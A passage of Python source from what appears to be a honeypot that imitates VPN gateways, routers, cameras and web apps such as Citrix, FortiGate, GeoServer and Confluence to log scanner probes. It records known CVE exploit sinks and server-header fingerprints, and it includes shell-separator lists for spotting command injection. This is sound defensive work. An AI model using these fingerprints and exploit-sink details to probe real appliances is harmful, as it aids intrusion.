        set_cookie_value = f"SVPNCOOKIE={uuid.uuid4().hex}; Path=/; Secure; HttpOnly"
    elif lpath == "/remote/fgt_lang":
        result_tag = "fortigate-fgt-lang"
        body = render_fortigate_lang_stub()
        content_type = "application/json; charset=utf-8"
    elif lpath == "/remote/error":
        result_tag = "fortigate-error"
        body = render_fortigate_error_html(host)
        content_type = "text/html; charset=utf-8"
    elif lpath == "/api/v2/cmdb/system/admin":
        result_tag = "fortigate-cmdb-admin"
        body = render_fortigate_admin_json(FORTIGATE_VPN_VERSION, FORTIGATE_VPN_BUILD)
        content_type = "application/json; charset=utf-8"
    elif lpath == "/api/v2/cmdb/system/status":
        result_tag = "fortigate-cmdb-status"
        body = render_fortigate_status_json(host, FORTIGATE_VPN_VERSION, FORTIGATE_VPN_BUILD)
        content_type = "application/json; charset=utf-8"
    elif lpath == "/api/v2/cmdb/system/global":
        result_tag = "fortigate-cmdb-global"
        body = render_fortigate_status_json(host, FORTIGATE_VPN_VERSION, FORTIGATE_VPN_BUILD)
        content_type = "application/json; charset=utf-8"
    elif lpath == "/api/v2/monitor/router/policy":
        result_tag = "fortigate-monitor-router-policy"
        body = render_fortigate_router_policy_json()
        content_type = "application/json; charset=utf-8"
    else:
        append_log({**log_context, "status": 404, "result": "fortigate-vpn-miss"})
        return web.Response(
            status=404, body=b"not found\n",
            headers={"Content-Type": "text/plain; charset=utf-8"},
        )

    log_entry: dict[str, object] = {
        **log_context,
        "status": 200,
        "result": result_tag,
        "fortigatePath": path,
        "fortigateMethod": method,
        "fortigateHasCmdInjection": has_cmd_injection,
        "bytes": len(body),
    }
    if request_body and result_tag == "fortigate-logincheck":
        username, has_password = extract_fortigate_logincheck_form(request_body, content_type_req)
        if username:
            log_entry["fortigateUsername"] = username
        log_entry["fortigateHasPassword"] = has_password
    if body_preview:
        log_entry["bodyPreview"] = body_preview[:400]
    append_log(log_entry)

    headers = {
        "Content-Type": content_type,
        "Cache-Control": "no-store",
        # FortiOS leaks "Server: xxxxxxxx-xxxxx" — a single space-prefixed
        # hex run that scanners use to fingerprint the appliance class.
        "Server": "xxxxxxxx-xxxxx",
    }
    if set_cookie_value:
        headers["Set-Cookie"] = set_cookie_value
    return web.Response(status=200, body=body, headers=headers)


async def _handle_globalprotect(
    request: web.Request,
    log_context: dict[str, object],
    path: str,
    request_body: bytes,
) -> web.Response:
    lpath = path.lower().split("?")[0]
    method = request.method
    host = str(log_context.get("host", ""))
    content_type_req = request.headers.get("Content-Type", "")

    body_preview = ""
    if request_body:
        body_preview = request_body[:WEBSHELL_BODY_DECODE_LIMIT].decode("utf-8", errors="replace")

    set_cookie_value: str | None = None

    if lpath in ("/global-protect/prelogin.esp", "/ssl-vpn/prelogin.esp"):
        result_tag = "globalprotect-prelogin"
        body = render_globalprotect_prelogin_xml(GLOBALPROTECT_VERSION)
        content_type = "application/xml; charset=utf-8"
    elif lpath == "/global-protect/login.esp":
        result_tag = "globalprotect-login"
        if method == "POST":
            body = (
                '<?xml version="1.0" encoding="UTF-8" ?>\n'
                "<response><status>error</status>"
                "<msg>Invalid credential</msg></response>\n"
            ).encode("utf-8")
            content_type = "application/xml; charset=utf-8"
            set_cookie_value = f"PHPSESSID={uuid.uuid4().hex}; Path=/; Secure; HttpOnly"
        else:
            body = render_globalprotect_login_html(host)
            content_type = "text/html; charset=utf-8"
    elif lpath == "/global-protect/getconfig.esp":
        result_tag = "globalprotect-getconfig"
        body = render_globalprotect_getconfig_xml(host, GLOBALPROTECT_VERSION)
        content_type = "application/xml; charset=utf-8"
    else:
        append_log({**log_context, "status": 404, "result": "globalprotect-miss"})
        return web.Response(
            status=404, body=b"not found\n",
            headers={"Content-Type": "text/plain; charset=utf-8"},
        )

    log_entry: dict[str, object] = {
        **log_context,
        "status": 200,
        "result": result_tag,
        "globalprotectPath": path,
        "globalprotectMethod": method,
        "bytes": len(body),
    }
    if request_body and method == "POST":
        username, has_password = extract_globalprotect_form(request_body, content_type_req)
        if username:
            log_entry["globalprotectUsername"] = username
        log_entry["globalprotectHasPassword"] = has_password
    if body_preview:
        log_entry["bodyPreview"] = body_preview[:400]
    append_log(log_entry)

    headers: dict[str, str] = {
        "Content-Type": content_type,
        "Cache-Control": "no-store",
        "Server": "PanWeb Server/",
    }
    if set_cookie_value:
        headers["Set-Cookie"] = set_cookie_value
    return web.Response(status=200, body=body, headers=headers)


async def _handle_sophos_vpn(
    request: web.Request,
    log_context: dict[str, object],
    path: str,
    request_body: bytes,
) -> web.Response:
    method = request.method
    host = str(log_context.get("host", ""))
    content_type_req = request.headers.get("Content-Type", "")

    body_preview = ""
    if request_body:
        body_preview = request_body[:WEBSHELL_BODY_DECODE_LIMIT].decode("utf-8", errors="replace")

    result_tag = "sophos-vpn-login"
    body = render_sophos_vpn_login_html(host)
    content_type = "text/html; charset=utf-8"
    set_cookie_value = f"JSESSIONID={uuid.uuid4().hex}; Path=/; Secure; HttpOnly"

    log_entry: dict[str, object] = {
        **log_context,
        "status": 200,
        "result": result_tag,
        "sophosPath": path,
        "sophosMethod": method,
        "bytes": len(body),
    }
    if request_body and method == "POST":
        username, has_password = extract_sophos_form(request_body, content_type_req)
        if username:
            log_entry["sophosUsername"] = username
        log_entry["sophosHasPassword"] = has_password
    if body_preview:
        log_entry["bodyPreview"] = body_preview[:400]
    append_log(log_entry)

    return web.Response(status=200, body=body, headers={
        "Content-Type": content_type,
        "Cache-Control": "no-store",
        "Server": "xxxx",
        "Set-Cookie": set_cookie_value,
    })


async def _handle_barracuda_vpn(
    request: web.Request,
    log_context: dict[str, object],
    path: str,
    request_body: bytes,
) -> web.Response:
    lpath = path.lower().split("?")[0]
    method = request.method
    host = str(log_context.get("host", ""))

    body_preview = ""
    if request_body:
        body_preview = request_body[:WEBSHELL_BODY_DECODE_LIMIT].decode("utf-8", errors="replace")

    if lpath == "/myvpn":
        result_tag = "barracuda-vpn-tunnel"
        body = render_barracuda_vpn_negotiation()
        content_type = "text/plain; charset=utf-8"
    elif lpath == "/cgi-mod/index.cgi":
        result_tag = "barracuda-vpn-login"
        body = render_barracuda_login_html(host)
        content_type = "text/html; charset=utf-8"
    else:
        append_log({**log_context, "status": 404, "result": "barracuda-vpn-miss"})
        return web.Response(
            status=404, body=b"not found\n",
            headers={"Content-Type": "text/plain; charset=utf-8"},
        )

    log_entry: dict[str, object] = {
        **log_context,
        "status": 200,
        "result": result_tag,
        "barracudaPath": path,
        "barracudaMethod": method,
        "bytes": len(body),
    }
    if body_preview:
        log_entry["bodyPreview"] = body_preview[:400]
    append_log(log_entry)

    return web.Response(status=200, body=body, headers={
        "Content-Type": content_type,
        "Cache-Control": "no-store",
    })


async def _handle_f5_bigip(
    request: web.Request,
    log_context: dict[str, object],
    path: str,
    request_body: bytes,
) -> web.Response:
    lpath = path.lower().split("?")[0]
    method = request.method
    host = str(log_context.get("host", ""))
    query = str(log_context.get("query", "") or "")
    content_type_req = request.headers.get("Content-Type", "")

    body_preview = ""
    if request_body:
        body_preview = request_body[:WEBSHELL_BODY_DECODE_LIMIT].decode("utf-8", errors="replace")

    has_path_traversal = "/.." in path or "%2e%2e" in path.lower()

    set_cookie_value: str | None = None

    if lpath == "/my.policy":
        result_tag = "f5-bigip-apm-policy"
        body = render_f5_my_policy_html(host, F5_BIGIP_VERSION)
        content_type = "text/html; charset=utf-8"
        set_cookie_value = f"MRHSession={uuid.uuid4().hex}; Path=/; Secure; HttpOnly"
    elif lpath == "/tmui/login.jsp" or lpath.startswith("/tmui/"):
        result_tag = "f5-bigip-tmui"
        body = render_f5_tmui_login_html(host, F5_BIGIP_VERSION)
        content_type = "text/html; charset=utf-8"
    elif lpath == "/sslvpnclient":
        result_tag = "f5-sslvpnclient"
        body = render_f5_sslvpnclient_xml()
        content_type = "application/xml; charset=utf-8"
    else:
        append_log({**log_context, "status": 404, "result": "f5-bigip-miss"})
        return web.Response(
            status=404, body=b"not found\n",
            headers={"Content-Type": "text/plain; charset=utf-8"},
        )

    log_entry: dict[str, object] = {
        **log_context,
        "status": 200,
        "result": result_tag,
        "f5Path": path,
        "f5Method": method,
        "f5HasPathTraversal": has_path_traversal,
        "bytes": len(body),
    }
    if request_body and method == "POST":
        username, has_password = extract_f5_form(request_body, content_type_req)
        if username:
            log_entry["f5Username"] = username
        log_entry["f5HasPassword"] = has_password
    if body_preview:
        log_entry["bodyPreview"] = body_preview[:400]
    append_log(log_entry)

    headers: dict[str, str] = {
        "Content-Type": content_type,
        "Cache-Control": "no-store",
        "Server": "BigIP",
    }
    if set_cookie_value:
        headers["Set-Cookie"] = set_cookie_value
    return web.Response(status=200, body=body, headers=headers)


async def _handle_docker_registry(
    request: web.Request,
    log_context: dict[str, object],
    path: str,
    request_body: bytes,
) -> web.Response:
    lpath = path.lower().split("?")[0]
    method = request.method

    auth_header = request.headers.get("Authorization", "")

    body: bytes = b""
    content_type = "application/json; charset=utf-8"
    result_tag = "docker-registry-miss"
    status_code = 404
    extra: dict[str, object] = {}

    registry_headers: dict[str, str] = {
        "Docker-Distribution-Api-Version": "registry/2.0",
        "X-Content-Type-Options": "nosniff",
    }

    if lpath in ("/v2/", "/v2"):
        result_tag = "docker-registry-version"
        body = b"{}"
        status_code = 200
    elif lpath == "/v2/_catalog":
        result_tag = "docker-registry-catalog"
        body = render_docker_registry_catalog()
        status_code = 200
    else:
        m = _DOCKER_REGISTRY_V2_RE.match(lpath)
        if m and m.group(1):
            repo = m.group(1)
            extra["dockerRepo"] = repo
            if "/tags/list" in lpath:
                result_tag = "docker-registry-tags"
                body = render_docker_registry_tags(repo)
                status_code = 200
            elif "/manifests/" in lpath:
                ref = lpath.rsplit("/manifests/", 1)[-1]
                extra["dockerRef"] = ref
                result_tag = "docker-registry-manifest"
                body = render_docker_registry_manifest(repo, ref)
                content_type = "application/vnd.docker.distribution.manifest.v2+json"
                status_code = 200
            elif "/blobs/" in lpath:
                digest = lpath.rsplit("/blobs/", 1)[-1]
                extra["dockerDigest"] = digest
                result_tag = "docker-registry-blob"
                body = b"\x1f\x8b\x08\x00" + secrets.token_bytes(64)
                content_type = "application/octet-stream"
                status_code = 200

    if auth_header:
        extra["dockerAuthHeader"] = auth_header[:HEADER_VALUE_LOG_LIMIT]
    extra["dockerMethod"] = method
    extra["dockerPath"] = path

    if method in ("PUT", "PATCH", "POST", "DELETE"):
        extra["dockerMutationMethod"] = method
        if request_body:
            extra["dockerBodySha256"] = hashlib.sha256(request_body).hexdigest()
            extra["dockerBodyPreview"] = request_body[:400].decode("utf-8", errors="replace")

    log_entry: dict[str, object] = {
        **log_context,
        "status": status_code,
        "result": result_tag,
        "bytes": len(body),
        **extra,
    }
    append_log(log_entry)

    if status_code == 404:
        return web.Response(
            status=404, body=b'{"errors":[{"code":"NAME_UNKNOWN","message":"repository name not known to registry"}]}\n',
            headers={**registry_headers, "Content-Type": "application/json; charset=utf-8"},
        )

    return web.Response(status=status_code, body=body, headers={
        **registry_headers,
        "Content-Type": content_type,
        "Cache-Control": "no-store",
    })


async def _handle_citrix_gateway(
    request: web.Request,
    log_context: dict[str, object],
    path: str,
    request_body: bytes,
) -> web.Response:
    lpath = path.lower()
    method = request.method
    host = str(log_context.get("host", ""))
    query = str(log_context.get("query", "") or "")
    content_type_req = request.headers.get("Content-Type", "")

    body_preview = ""
    if request_body:
        body_preview = request_body[:WEBSHELL_BODY_DECODE_LIMIT].decode("utf-8", errors="replace")

    has_cmd_injection = _citrix_has_cmd_injection(body_preview, path, query)

    set_cookie_value: str | None = None

    if lpath == "/vpn/index.html":
        result_tag = "citrix-vpn-index"
        body = render_citrix_gateway_index_html(host, CITRIX_GATEWAY_VERSION)
        content_type = "text/html; charset=utf-8"
    elif lpath == "/logon/logonpoint/index.html":
        result_tag = "citrix-logonpoint"
        body = render_citrix_logonpoint_html(host, CITRIX_GATEWAY_VERSION)
        content_type = "text/html; charset=utf-8"
    elif lpath == "/vpn/js/rdx/core/lang/rdx_en.json.gz":
        result_tag = "citrix-rdx-lang"
        body = render_citrix_rdx_lang_stub()
        content_type = "application/json; charset=utf-8"
    elif lpath == "/citrix/xenapp/auth/login.aspx":
        result_tag = "citrix-xenapp-login"
        body = render_citrix_xenapp_login_html(host)
        content_type = "text/html; charset=utf-8"
    elif lpath in {"/cgi/login", "/p/u/doauthentication.do"}:
        result_tag = "citrix-cgi-login" if lpath == "/cgi/login" else "citrix-doauthentication"
        # Extract the submitted login (if any) so the failure-page noscript
        # text reflects what the scanner sent — keeps the response from
        # looking like a static page that always says the same thing.
        submitted_login, _ = extract_citrix_gateway_form(request_body, content_type_req)
        body = render_citrix_login_post(submitted_login)
        content_type = "text/html; charset=utf-8"
        # NSC_AAAC is the NetScaler Gateway session cookie that
        # CVE-2023-4966 ("CitrixBleed") leaks via heap memory; a
        # per-request hex value never repeats across the fleet, so any
        # later request replaying a captured cookie can be linked to
        # the issuance event.
        set_cookie_value = f"NSC_AAAC={uuid.uuid4().hex}; Path=/; Secure; HttpOnly"
    else:
        append_log({**log_context, "status": 404, "result": "citrix-gateway-miss"})
        return web.Response(
            status=404, body=b"not found\n",
            headers={"Content-Type": "text/plain; charset=utf-8"},
        )

    log_entry: dict[str, object] = {
        **log_context,
        "status": 200,
        "result": result_tag,
        "citrixGatewayPath": path,
        "citrixGatewayMethod": method,
        "citrixHasCmdInjection": has_cmd_injection,
        "bytes": len(body),
    }
    if request_body and result_tag in {
        "citrix-cgi-login", "citrix-doauthentication", "citrix-xenapp-login",
    }:
        username, has_password = extract_citrix_gateway_form(request_body, content_type_req)
        if username:
            log_entry["citrixUsername"] = username
        log_entry["citrixHasPassword"] = has_password
    if body_preview:
        log_entry["bodyPreview"] = body_preview[:400]
    append_log(log_entry)

    headers = {
        "Content-Type": content_type,
        "Cache-Control": "no-store",
        # NetScaler advertises "Server: NetScaler" on most builds; the
        # fingerprint scrapers diff this header in the Shitrix and
        # CitrixBleed exploit chains.
        "Server": "NetScaler",
    }
    if set_cookie_value:
        headers["Set-Cookie"] = set_cookie_value
    return web.Response(status=200, body=body, headers=headers)


async def _handle_rdweb(
    request: web.Request,
    log_context: dict[str, object],
    path: str,
    request_body: bytes,
) -> web.Response:
    lpath = path.lower()
    method = request.method
    host = str(log_context.get("host", ""))
    content_type_req = request.headers.get("Content-Type", "")

    body_preview = ""
    if request_body:
        body_preview = request_body[:WEBSHELL_BODY_DECODE_LIMIT].decode("utf-8", errors="replace")

    set_cookie_value: str | None = None

    if lpath in {"/rdweb", "/rdweb/", "/rdweb/pages/", "/rdweb/pages/en-us/login.aspx"}:
        # Treat all the landing variants as the login form; if a POST lands
        # on `/rdweb/pages/en-us/login.aspx` we still serve the same HTML
        # but log it as a credential POST and mint a session cookie.
        if method == "POST" and lpath == "/rdweb/pages/en-us/login.aspx":
            result_tag = "rdweb-login-post"
            body = render_rdweb_default_html(host)
            content_type = "text/html; charset=utf-8"
            # TSWAAuthHttpOnlyCookie is the real RDWeb session cookie
            # name; per-request hex value so replays are attributable.
            set_cookie_value = (
                f"TSWAAuthHttpOnlyCookie={uuid.uuid4().hex}; Path=/RDWeb; Secure; HttpOnly"
            )
        else:
            result_tag = "rdweb-login"
            body = render_rdweb_login_html(host, RDWEB_SERVER_BUILD)
            content_type = "text/html; charset=utf-8"
    elif lpath == "/rdweb/pages/en-us/default.aspx":
        result_tag = "rdweb-default"
        body = render_rdweb_default_html(host)
        content_type = "text/html; charset=utf-8"
    else:
        append_log({**log_context, "status": 404, "result": "rdweb-miss"})
        return web.Response(
            status=404, body=b"not found\n",
            headers={"Content-Type": "text/plain; charset=utf-8"},
        )

    log_entry: dict[str, object] = {
        **log_context,
        "status": 200,
        "result": result_tag,
        "rdwebPath": path,
        "rdwebMethod": method,
        "bytes": len(body),
    }
    if request_body and result_tag == "rdweb-login-post":
        username, has_password = extract_rdweb_form(request_body, content_type_req)
        if username:
            log_entry["rdwebUsername"] = username
        log_entry["rdwebHasPassword"] = has_password
    if body_preview:
        log_entry["bodyPreview"] = body_preview[:400]
    append_log(log_entry)

    headers = {
        "Content-Type": content_type,
        "Cache-Control": "no-store",
        # Real RDWeb is fronted by IIS; this header is the primary
        # fingerprint scrapers diff before sending follow-up probes.
        "Server": "Microsoft-IIS/10.0",
        "X-Powered-By": "ASP.NET",
    }
    if set_cookie_value:
        headers["Set-Cookie"] = set_cookie_value
    return web.Response(status=200, body=body, headers=headers)


async def _handle_hikvision(
    request: web.Request,
    log_context: dict[str, object],
    path: str,
    query_string: str,
    request_body: bytes,
) -> web.Response:
    """Fake Hikvision ISAPI surface. GETs return plausible XML so banner-grab
    fleets keep coming back; POST/PUT bodies are scanned for shell-meta
    indicators (CVE-2021-36260 command-injection sink ships the command in
    the language parameter)."""
    lpath = path.lower()
    method = request.method
    body_preview = ""
    if request_body:
        body_preview = request_body[:WEBSHELL_BODY_DECODE_LIMIT].decode("utf-8", errors="replace")

    has_cmdi = _hikvision_has_cmdi(query_string or "", body_preview)

    if lpath == "/sdk/weblanguage":
        result_tag = "hikvision-sdk-weblanguage"
        body = (
            b'<?xml version="1.0" encoding="UTF-8"?>\n'
            b'<Language version="2.0" xmlns="http://www.hikvision.com/ver20/XMLSchema">\n'
            b'<language>en</language>\n'
            b'</Language>\n'
        )
    elif lpath == "/isapi/system/deviceinfo":
        result_tag = "hikvision-isapi-deviceinfo"
        body = (
            f'<?xml version="1.0" encoding="UTF-8"?>\n'
            f'<DeviceInfo version="2.0" xmlns="http://www.hikvision.com/ver20/XMLSchema">\n'
            f'<deviceName>IP CAMERA</deviceName>\n'
            f'<deviceID>fa379a2c-1ec1-11b2-8000-00408cdf0000</deviceID>\n'
            f'<model>DS-2CD2042WD-I</model>\n'
            f'<serialNumber>DS-2CD2042WD-I20191205AAWRB12345678</serialNumber>\n'
            f'<firmwareVersion>{HIKVISION_FIRMWARE_VERSION}</firmwareVersion>\n'
            f'<firmwareReleasedDate>build 191205</firmwareReleasedDate>\n'
            f'<deviceType>IPCamera</deviceType>\n'
            f'</DeviceInfo>\n'
        ).encode("utf-8")
    elif lpath == "/isapi/security/usercheck":
        result_tag = "hikvision-isapi-usercheck"
        body = (
            b'<?xml version="1.0" encoding="UTF-8"?>\n'
            b'<userCheck version="2.0" xmlns="http://www.hikvision.com/ver20/XMLSchema">\n'
            b'<statusValue>200</statusValue>\n'
            b'<statusString>OK</statusString>\n'
            b'<isDefaultPassword>false</isDefaultPassword>\n'
            b'<isRiskPassword>false</isRiskPassword>\n'
            b'<isActivated>true</isActivated>\n'
            b'</userCheck>\n'
        )
    else:
        # Path matched the set but no renderer — defensive 404.
        append_log({**log_context, "status": 404, "result": "hikvision-miss"})
        return web.Response(
            status=404, body=b"not found\n",
            headers={"Content-Type": "text/plain; charset=utf-8"},
        )

    log_entry = {
        **log_context,
        "status": 200,
        "result": result_tag,
        "hikvisionPath": path,
        "hikvisionMethod": method,
        "hikvisionHasCmdInjection": has_cmdi,
        "bytes": len(body),
    }
    if body_preview:
        log_entry["bodyPreview"] = body_preview
    append_log(log_entry)

    return web.Response(
        status=200, body=body,
        headers={
            "Content-Type": "application/xml; charset=utf-8",
            # Match the server-header fingerprint real Hikvision firmware
            # advertises; scanners gate follow-on payloads on this string.
            "Server": "App-webs/",
            "Cache-Control": "no-store",
        },
    )


async def _handle_hnap1(
    request: web.Request,
    log_context: dict[str, object],
    path: str,
    query_string: str,
    request_body: bytes,
) -> web.Response:
    """Fake D-Link / Linksys HNAP1 SOAP surface. GETs return a plausible
    DeviceSettings envelope so banner-grab fleets keep coming back; the
    SOAPAction header on POST/HEAD/GET is the highest-signal exploit
    sink (CVE-2015-2051 ships the command directly inside the action
    URI), so it gets logged and scanned for shell-meta indicators
    alongside the body."""
    method = request.method
    soap_action = request.headers.get("SOAPAction", "") or request.headers.get("Soapaction", "")
    soap_action_preview = soap_action[:512]

    body_preview = ""
    if request_body:
        body_preview = request_body[:WEBSHELL_BODY_DECODE_LIMIT].decode("utf-8", errors="replace")

    has_cmdi = _hnap1_has_cmdi(soap_action, query_string or "", body_preview)

    if method == "POST":
        # Generic SOAP "OK" envelope. Real HNAP1 endpoints respond with an
        # action-specific element (e.g. <LoginResponse>); we use the action
        # name from the header when present so the response shape tracks
        # the request and scanners parsing the response don't bail.
        action_name = ""
        if "/HNAP1/" in soap_action:
            tail = soap_action.split("/HNAP1/", 1)[1].strip().strip('"').strip("'")
            # Strip any injected shell payload after the action name.
            for sep in ("`", "$(", ";", "&", "|", " "):
                if sep in tail:
                    tail = tail.split(sep, 1)[0]
            # SOAPAction values can be quoted; strip trailing quotes again.
            tail = tail.strip('"').strip("'")
            if tail and tail.replace("_", "").replace("-", "").isalnum():
                action_name = tail
        result_element = (action_name + "Response") if action_name else "HNAP1Response"
        body = (
            f'<?xml version="1.0" encoding="UTF-8"?>\n'
            f'<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" '
            f'xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" '
            f'xmlns:xsd="http://www.w3.org/2001/XMLSchema">\n'
            f'<soap:Body>\n'
            f'<{result_element} xmlns="http://purenetworks.com/HNAP1/">\n'
            f'<{result_element}Result>OK</{result_element}Result>\n'
            f'</{result_element}>\n'
            f'</soap:Body>\n'
            f'</soap:Envelope>\n'
        ).encode("utf-8")
        result_tag = "hnap1-soap-action"
    else:
        # GET / HEAD — return the device-discovery DeviceSettings envelope
        # so single-fetch fingerprint scans see a plausible router banner.
        body = (
            f'<?xml version="1.0" encoding="UTF-8"?>\n'
            f'<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" '
            f'xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" '
            f'xmlns:xsd="http://www.w3.org/2001/XMLSchema">\n'
            f'<soap:Body>\n'
            f'<DeviceSettings xmlns="http://purenetworks.com/HNAP1/">\n'
            f'<Type>GatewayWithWiFi</Type>\n'
            f'<DeviceName>{HNAP1_MODEL}</DeviceName>\n'
            f'<VendorName>{HNAP1_VENDOR}</VendorName>\n'
            f'<ModelName>{HNAP1_MODEL}</ModelName>\n'
            f'<ModelDescription>Wireless N Dual Band Gigabit Router</ModelDescription>\n'
            f'<FirmwareVersion>{HNAP1_FIRMWARE_VERSION}</FirmwareVersion>\n'
            f'<PresentationURL>http://192.168.0.1</PresentationURL>\n'
            f'<SOAPActions>\n'
            f'<string>http://purenetworks.com/HNAP1/GetDeviceSettings</string>\n'
            f'<string>http://purenetworks.com/HNAP1/Login</string>\n'
            f'<string>http://purenetworks.com/HNAP1/GetWLanRadios</string>\n'
            f'</SOAPActions>\n'
            f'</DeviceSettings>\n'
            f'</soap:Body>\n'
            f'</soap:Envelope>\n'
        ).encode("utf-8")
        result_tag = "hnap1-discovery"

    log_entry = {
        **log_context,
        "status": 200,
        "result": result_tag,
        "hnap1Path": path,
        "hnap1Method": method,
        "hnap1HasCmdInjection": has_cmdi,
        "bytes": len(body),
    }
    if soap_action_preview:
        log_entry["hnap1SoapAction"] = soap_action_preview
    if body_preview:
        log_entry["bodyPreview"] = body_preview
    append_log(log_entry)

    return web.Response(
        status=200, body=body,
        headers={
            "Content-Type": "text/xml; charset=utf-8",
            # `Mathopd` is the embedded HTTP server that ships on most
            # D-Link DIR-series firmware; matching this header keeps the
            # fingerprint plausible for scanners that gate on it.
            "Server": "Mathopd/1.5p6",
            "Cache-Control": "no-store",
        },
    )


async def _handle_geoserver(
    request: web.Request,
    log_context: dict[str, object],
    path: str,
    request_body: bytes,
) -> web.Response:
    lpath = path.lower()
    method = request.method
    host = str(log_context.get("host", ""))
    query = str(log_context.get("query", "") or "")

    body_preview = ""
    if request_body:
        try:
            body_preview = request_body[:512].decode("utf-8", errors="replace")
        except UnicodeDecodeError:
            body_preview = ""

    has_ognl = _geoserver_has_ognl(query, body_preview)

    log_extra: dict[str, object] = {
        "geoserverPath": path,
        "geoserverMethod": method,
        "geoserverHasOgnl": has_ognl,
    }
    if has_ognl:
        # Truncate aggressively: a single OGNL payload can run multi-KB and
        # the existing log fields stay compact.
        log_extra["geoserverPayloadPreview"] = (query + " | " + body_preview)[:400]

    # /geoserver and /geoserver/ -> 302 to /geoserver/web/. Real GeoServer
    # redirects this way, and a 302 keeps banner-grab fleets happy without
    # rendering any content.
    if lpath in {"/geoserver", "/geoserver/"}:
        append_log({
            **log_context,
            "status": 302,
            "result": "geoserver-redirect-root",
            **log_extra,
            "bytes": 0,
        })
        return web.Response(
            status=302,
            body=b"",
            headers={"Location": "/geoserver/web/", "Cache-Control": "no-store"},
        )

    # /geoserver/index.html and the /geoserver/web/ admin shell.
    if lpath == "/geoserver/index.html" or lpath.startswith("/geoserver/web"):
        # Distinguish the AboutGeoServerPage CVE trigger from the generic
        # admin shell so analysis can grep for it directly.
        if "aboutgeoserverpage" in lpath:
            result_tag = "geoserver-about-page"
            body = render_geoserver_about(host, GEOSERVER_VERSION)
        else:
            result_tag = "geoserver-web-landing"
            body = render_geoserver_landing(host, GEOSERVER_VERSION)
        append_log({
            **log_context,
            "status": 200,
            "result": result_tag,
            **log_extra,
            "bytes": len(body),
        })
        return web.Response(
            status=200, body=body,
            headers={
                "Content-Type": "text/html; charset=utf-8",
                "Cache-Control": "no-store",
            },
        )

    # OGC service endpoints — same surface as the wicket page for CVE-2024-36401.
    for svc_path, svc in (
        ("/geoserver/ows", "wfs"),
        ("/geoserver/wfs", "wfs"),
        ("/geoserver/wms", "wms"),
        ("/geoserver/wcs", "wcs"),
        ("/geoserver/wps", "wps"),
    ):
        if lpath == svc_path:
            body = render_geoserver_capabilities(svc, GEOSERVER_VERSION)
            append_log({
                **log_context,
                "status": 200,
                "result": f"geoserver-ogc-{svc}",
                **log_extra,
                "bytes": len(body),
            })
            return web.Response(
                status=200, body=body,
                headers={
                    "Content-Type": "application/xml; charset=utf-8",
                    "Cache-Control": "no-store",
                },
            )

    # /geoserver/rest/... — 401 Basic. Real GeoServer requires HTTP Basic
    # auth on the REST API; serving a 401 with the proper challenge keeps
    # tooling like geoserver-cli happy.
    if lpath.startswith("/geoserver/rest"):
        append_log({
            **log_context,
            "status": 401,
            "result": "geoserver-rest-401",
            **log_extra,
            "bytes": 0,
        })
        return web.Response(
            status=401, body=b"",
            headers={
                "WWW-Authenticate": 'Basic realm="GeoServer Realm"',
                "Cache-Control": "no-store",
            },
        )

    # Anything else under /geoserver/ — log + 404.
    append_log({
        **log_context,
        "status": 404,
        "result": "geoserver-miss",
        **log_extra,
        "bytes": 0,
    })
    return web.Response(
        status=404, body=b"not found\n",
        headers={"Content-Type": "text/plain; charset=utf-8"},
    )


async def _handle_coldfusion(
    request: web.Request,
    log_context: dict[str, object],
    path: str,
    request_body: bytes,
) -> web.Response:
    lpath = path.lower()
    method = request.method
    host = str(log_context.get("host", ""))
    query = str(log_context.get("query", "") or "")
    content_type_req = request.headers.get("Content-Type", "")
    has_auth = bool(request.headers.get("Authorization", "")) or bool(request.headers.get("Cookie", ""))

    body_preview = ""
    if request_body:
        body_preview = request_body[:512].decode("utf-8", errors="replace")

    has_exploit = _coldfusion_has_exploit(path, query, body_preview)
    query_params = parse_qs(query, keep_blank_values=True) if query else {}
    method_name = ""
    for key in ("method", "METHOD"):
        values = query_params.get(key)
        if values and values[0]:
            method_name = values[0][:120]
            break

    log_extra: dict[str, object] = {
        "coldfusionPath": path,
        "coldfusionMethod": method,
        "coldfusionHasAuth": has_auth,
        "coldfusionHasExploit": has_exploit,
        "contentType": content_type_req[:120],
    }
    if method_name:
        log_extra["coldfusionAction"] = method_name
    if body_preview:
        log_extra["bodyPreview"] = body_preview
    if has_exploit:
        log_extra["coldfusionPayloadPreview"] = (query + " | " + body_preview)[:400]

    if lpath in {"/indice.cfm", "/menu.cfm", "/base.cfm"}:
        result_tag = "coldfusion-public-cfm"
        body = render_coldfusion_public_page(path, host, COLDFUSION_VERSION)
        content_type = "text/html; charset=utf-8"
    elif lpath == "/cfide/componentutils" or lpath.startswith("/cfide/componentutils/"):
        result_tag = "coldfusion-componentutils"
        body = render_coldfusion_componentutils(host, COLDFUSION_VERSION)
        content_type = "text/html; charset=utf-8"
    elif lpath.startswith("/cfide/administrator/"):
        result_tag = "coldfusion-admin-post" if method == "POST" else "coldfusion-admin-login"
        if method == "POST":
            body = render_coldfusion_admin_dashboard(host, COLDFUSION_VERSION)
        else:
            body = render_coldfusion_admin_login(host, COLDFUSION_VERSION)
        content_type = "text/html; charset=utf-8"
    elif lpath.startswith("/cfide/adminapi/"):
        result_tag = "coldfusion-adminapi"
        body = render_coldfusion_adminapi(method_name, COLDFUSION_VERSION)
        content_type = "text/xml; charset=utf-8"
    else:
        append_log({**log_context, "status": 404, "result": "coldfusion-miss", **log_extra})
        return web.Response(
            status=404, body=b"not found\n",
            headers={"Content-Type": "text/plain; charset=utf-8"},
        )

    append_log({
        **log_context,
        "status": 200,
        "result": result_tag,
        **log_extra,
        "bytes": len(body),
    })
    return web.Response(
        status=200, body=body,
        headers={
            "Content-Type": content_type,
            "Cache-Control": "no-store",
        },
    )


async def _handle_confluence(
    request: web.Request,
    log_context: dict[str, object],
    path: str,
    request_body: bytes,
) -> web.Response:
    """Fake Atlassian Confluence surface. Returns a plausible login page
    on the path matchers, the small JSON / HTML fragments real Confluence
    serves on `user-dark-features` / `editor-preload-container`, and a
    permissive 200 on any path containing an OGNL injection (the canonical
    CVE-2022-26134 shape, URL-encoded inside the path itself).

    The OAST callback hostname is extracted from path/query/body so the
    same probe is correlatable across sensors regardless of source IP."""
    lpath = path.lower()
    method = request.method
    host = str(log_context.get("host", ""))
    query = str(log_context.get("query", "") or "")

    body_preview = ""
    if request_body:
        body_preview = request_body[:WEBSHELL_BODY_DECODE_LIMIT].decode(
            "utf-8", errors="replace",
        )

